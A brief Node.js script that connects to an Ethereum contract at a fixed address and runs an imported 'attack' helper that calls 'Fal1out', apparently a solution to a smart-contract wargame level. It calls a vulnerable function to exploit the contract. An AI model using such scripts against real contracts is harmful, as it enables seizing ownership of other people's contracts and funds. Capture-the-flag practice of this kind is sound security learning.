require("dotenv").config();
const attack = require("../scripts/attack") 
const { createAlchemyWeb3 } = require("@alch/alchemy-web3");
const web3 = createAlchemyWeb3(process.env.API_URL);

const abi = require("./abi.json");
const contractAddress = "0xa6A09E57C3f378478e8272635e4C1EB203A883Ea";
const contract = new web3.eth.Contract(abi, contractAddress);

attack(
	contract,
	"write",
	"Fal1out",
	"0",
);
